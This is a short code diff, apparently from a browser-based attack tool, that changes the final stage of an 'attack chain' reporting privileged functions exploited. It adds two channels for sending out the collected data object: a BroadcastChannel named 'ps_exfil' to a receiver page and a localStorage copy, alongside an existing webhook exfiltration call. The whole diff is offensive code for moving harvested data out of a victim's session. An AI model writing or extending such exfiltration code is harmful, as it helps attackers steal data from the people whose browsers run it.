@@ -443,8 +443,15 @@ async function runChain() {
   D.attackDurationSec = parseFloat(elapsed);
   pr(100, 'Attack chain complete in ' + elapsed + 's — ' + D.functionsUsed.length + ' privileged functions exploited');
 
-  // ===== EXFILTRATE TO WEBHOOK =====
+  // ===== EXFILTRATE =====
+  // 1. Send to webhook if configured
   const exfilResult = await exfiltrate(D);
+
+  // 2. Broadcast to receiver.html on same origin (BroadcastChannel)
+  try { new BroadcastChannel('ps_exfil').postMessage(D); } catch(e) {}
+
+  // 3. Store in localStorage so receiver can pick it up
+  try { localStorage.setItem('ps_exfil_data', JSON.stringify(D)); } catch(e) {}
 
   // ===== RENDER SUMMARY =====
   const exfDiv = document.getElementById('exfil');
